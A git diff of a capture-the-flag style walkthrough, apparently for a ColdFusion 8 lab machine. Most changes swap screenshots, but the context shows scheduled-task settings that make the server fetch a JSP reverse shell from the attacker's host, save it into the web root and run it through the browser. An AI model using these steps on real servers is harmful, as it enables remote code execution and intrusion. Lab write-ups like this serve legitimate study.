@@ -442,7 +442,7 @@ Debugging & Logging
 ```
 Scheduled Tasks! We could use this to download and run our reverse shell payload.
 
-![TaskScheduler](https://user-images.githubusercontent.com/21957042/114262184-20c78400-9a11-11eb-8b9b-de692195f137.png)
+![Schedule](https://user-images.githubusercontent.com/21957042/114263516-82d7b780-9a18-11eb-9cef-3b8b8a13fc6b.png)
 
 Let's create a payload.
 ```
@@ -457,7 +457,7 @@ Saved as: meterpreter.exe
 
 Let's Schedule New Task.
 
-![Task](https://user-images.githubusercontent.com/21957042/114262187-21f8b100-9a11-11eb-95a9-28560b3db8ef.png)
+![meterpreter_old](https://user-images.githubusercontent.com/21957042/114263514-81a68a80-9a18-11eb-9a5f-bb2e4c8e5738.png)
 
 ```
 Task Name: Reverse Shell
@@ -469,7 +469,7 @@ Submit
 ```
 This task was scheduled successfully.
 
-![TaskScheduled](https://user-images.githubusercontent.com/21957042/114262186-21601a80-9a11-11eb-87ee-cb85ca1ea203.png)
+![ScheduledTask](https://user-images.githubusercontent.com/21957042/114263510-7fdcc700-9a18-11eb-832c-e743bd532210.png)
 
 Let's run the Python HTTPServer also.
 ```
@@ -500,16 +500,13 @@ Server Settings
 	Font Management
 	Java and JVM
 	Settings Summary
-	
-Active ColdFusion Mappings
-Actions 	Logical Path 	Directory Path
-  		/CFIDE  	C:\ColdFusion8\wwwroot\CFIDE 
-Edit Delete   	/gateway  	C:\ColdFusion8\gateway\cfc
 ```
+
+![Mapping](https://user-images.githubusercontent.com/21957042/114263507-7eab9a00-9a18-11eb-96dc-0989120b3fa5.png)
 
 Let's Schedule New Task again.
 
-![TaskNew](https://user-images.githubusercontent.com/21957042/114262188-22914780-9a11-11eb-8c59-015079ceb60d.png)
+![meterpreter](https://user-images.githubusercontent.com/21957042/114263513-810df400-9a18-11eb-975b-2f3a2de2c065.png)
 
 ```
 Task Name: Reverse Shell
@@ -533,9 +530,12 @@ Saved as: jsp_shell.jsp
 ```
 
 Let's Schedule New Task.
+
+![jsp_shell](https://user-images.githubusercontent.com/21957042/114263512-80755d80-9a18-11eb-8daf-0d54dbb036fe.png)
+
 ```
 Task Name: Reverse Shell
-Frequency: Daily every 1 Min 1 Sec Start 6:22 μμ
+Frequency: Daily every 1 Min 1 Sec Start 6:22
 URL: http://10.10.x.x/jsp_shell.jsp
 Publish: Save output to a file
 File: C:\ColdFusion8\wwwroot\CFIDE\jsp_shell.jsp
@@ -544,6 +544,8 @@ Submit
 This task was scheduled successfully.
 
 Upon pressing the "Run Scheduled Task" button, it ran successfully with the message "This scheduled task was completed successfully.".
+
+![Success](https://user-images.githubusercontent.com/21957042/114263515-823f2100-9a18-11eb-8cf1-dece21b94138.png)
 
 To execute the payload we just placed, we need to go to the browser and navigate to `http://10.10.10.11:8500/CFIDE/jsp_shell.jsp`, and check our listener.
 ```
